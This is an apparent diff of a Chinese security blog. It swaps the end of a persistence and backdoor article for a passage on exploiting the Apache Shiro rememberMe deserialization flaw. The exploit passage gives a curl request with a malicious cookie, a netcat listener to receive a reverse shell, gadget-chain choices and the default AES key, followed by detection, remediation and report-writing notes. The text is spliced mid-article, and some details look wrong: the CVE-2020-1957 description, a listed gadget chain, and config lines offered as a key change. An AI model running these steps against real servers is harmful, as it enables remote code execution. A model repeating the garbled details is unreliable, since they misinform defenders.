+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://靶机/api <span class=se>\
+</span></span></span><span class=line><span class=cl>  -H <span class=s2>&#34;Cookie: rememberMe=加密后的Base64字符串&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=第-5-步接收反弹-shell>第 5 步：接收反弹 shell</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvvp <span class=m>4444</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=shiro-cve-2020-1957721-绕过>Shiro CVE-2020-1957（721 绕过）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>先取证，再断后门
-</span></span><span class=line><span class=cl>删除计划任务/服务/注册表/脚本/密钥
-</span></span><span class=line><span class=cl>杀进程、清持久化
-</span></span><span class=line><span class=cl>修漏洞防止再次进入
-</span></span></code></pre></td></tr></table></div></div><h2 id=五小结>五、小结</h2><p>权限维持的本质是“利用系统自启动机制藏后门”。防守重点不是背后门列表，而是<strong>掌握主机的自启动/自运行面</strong>（计划任务、服务、启动项、登录脚本），定期审计。清理时先取证、再断链。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/>权限维持</a>
-<a href=/tags/%E5%90%8E%E9%97%A8/>后门</a>
-<a href=/tags/windows/>Windows</a>
-<a href=/tags/linux/>Linux</a>
-<a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088037/><div class=article-details><h2 class=article-title>内网渗透：信息收集与存活主机探测</h2></div></a></article><article><a href=/p/751088083/><div class=article-details><h2 class=article-title>Linux 提权深入：脏牛等内核漏洞</h2></div></a></article><article><a href=/p/751088068/><div class=article-details><h2 class=article-title>内网渗透：Windows 提权实战</h2></div></a></article><article><a href=/p/751088057/><div class=article-details><h2 class=article-title>内网渗透：Linux 提权实战</h2></div></a></article><article><a href=/p/751088111/><div class=article-details><h2 class=article-title>C2 上线后的持久化与免杀组合实战</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>修复版本：Shiro 1.4.1 修复了默认密钥问题
+</span></span><span class=line><span class=cl>但 CVE-2020-1957：修复不彻底，仍可通过特定路径触发
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>利用方式相同，但需：
+</span></span><span class=line><span class=cl>1. 找到应用自定义密钥（如果换过默认密钥）
+</span></span><span class=line><span class=cl>2. 使用 CommonsBeanutils1 等更多 Gadget 链
+</span></span></code></pre></td></tr></table></div></div><h2 id=四gadget-链选择>四、Gadget 链选择</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>┌─────────────────────┬──────────────────────────────────┐
+</span></span><span class=line><span class=cl>│  目标环境          │  推荐 Gadget 链                  │
+</span></span><span class=line><span class=cl>├─────────────────────┼──────────────────────────────────┤
+</span></span><span class=line><span class=cl>│ Spring 存在        │ CommonsCollections5/6            │
+</span></span><span class=line><span class=cl>│ Tomcat 9.x        │ TomcatBytesReadLimit             │
+</span></span><span class=line><span class=cl>│ 标准 Java 环境    │ CommonsBeanutils1/2              │
+</span></span><span class=line><span class=cl>│ 低版本 Spring     │ SpringBean1                      │
+</span></span><span class=line><span class=cl>│ 通用               │ Groovy1/2                        │
+</span></span><span class=line><span class=cl>└─────────────────────┴──────────────────────────────────┘
+</span></span></code></pre></td></tr></table></div></div><h2 id=五检测>五、检测</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>• WAF：拦截 rememberMe Cookie 异常长度/内容
+</span></span><span class=line><span class=cl>• 日志：含 rememberMe 的异常请求
+</span></span><span class=line><span class=cl>• 应用日志：反序列化异常、ClassNotFoundException
+</span></span><span class=line><span class=cl>• 网络：异常 Java 进程启动
+</span></span></code></pre></td></tr></table></div></div><h2 id=六防御与修复>六、防御与修复</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>1. 升级 Shiro ≥ 1.4.2（彻底修复 CVE-2016-4437 和 CVE-2020-1957）
+</span></span><span class=line><span class=cl>2. 如果使用低版本，务必更换默认 AES 密钥：
+</span></span><span class=line><span class=cl>   在 shiro.ini 中：
+</span></span><span class=line><span class=cl>     sessionManager.cookie.enabled = false
+</span></span><span class=line><span class=cl>   或通过代码设置：
+</span></span><span class=line><span class=cl>     cookie.setSecure(true);
+</span></span><span class=line><span class=cl>     cookie.setHttpOnly(true);
+</span></span><span class=line><span class=cl>3. 关闭 rememberMe 功能（如不需要）
+</span></span><span class=line><span class=cl>4. WAF 规则：拦截含异常 Base64 的 rememberMe Cookie
+</span></span><span class=line><span class=cl>5. 禁用不必要的 Java 反序列化
+</span></span></code></pre></td></tr></table></div></div><h2 id=七报告中的正确写法>七、报告中的正确写法</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>发现：目标应用使用 Apache Shiro 1.2.5，rememberMe Cookie 使用默认 AES 密钥（kPHbIxhk5nx4W92cYp8XgQ==），存在 CVE-2016-4437 反序列化远程代码执行漏洞。
+</span></span><span class=line><span class=cl>利用方式：构造恶意序列化对象 → AES 加密 → 放入 Cookie → 服务端反序列化执行任意代码。
+</span></span><span class=line><span class=cl>影响：攻击者无需登录即可执行服务器任意命令，获取 Web 应用进程权限。
+</span></span><span class=line><span class=cl>建议：立即升级 Shiro ≥ 1.4.2；如无法升级，关闭 rememberMe 功能或更换默认密钥；WAF 拦截异常 Cookie。
+</span></span></code></pre></td></tr></table></div></div><h2 id=八小结>八、小结</h2><p>Shiro rememberMe 漏洞是 Java Web 中经典的反序列化漏洞。核心问题是默认密钥硬编码 + 反序列化时未校验类型。修复的核心是升级版本 + 更换密钥。Gadget 链的选择取决于目标应用的 classpath。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/shiro/>Shiro</a>
+<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>反序列化</a>
+<a href=/tags/rememberme/>RememberMe</a>
+<a href=/tags/rce/>RCE</a>
+<a href=/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/>漏洞复现</a>
+<a href=/tags/java/>Java</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>最后更新于 Aug 30, 2026 10:00 +0800</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088075/><div class=article-details><h2 class=article-title>Log4j2 RCE 漏洞复现与缓解（CVE-2021-44228 完整分析）</h2></div></a></article><article><a href=/p/751088074/><div class=article-details><h2 class=article-title>Fastjson 反序列化 RCE 漏洞复现（含版本绕过与 JNDI 注入）</h2></div></a></article><article><a href=/p/751088077/><div class=article-details><h2 class=article-title>反序列化原理与风险（Java/PHP/Python 通用解析）</h2></div></a></article><article><a href=/p/751088073/><div class=article-details><h2 class=article-title>用友 NC 反序列化与接口 RCE 利用</h2></div></a></article><article><a href=/p/751088074/><div class=article-details><h2 class=article-title>Jenkins 未授权访问与代码执行利用</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
 2020 -
 2026 SoulJian小站</div><div class=busuanzi-count><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><span class=site-uv title=访客数><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="visitor-icon"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
 <span id=busuanzi_value_site_uv></span>
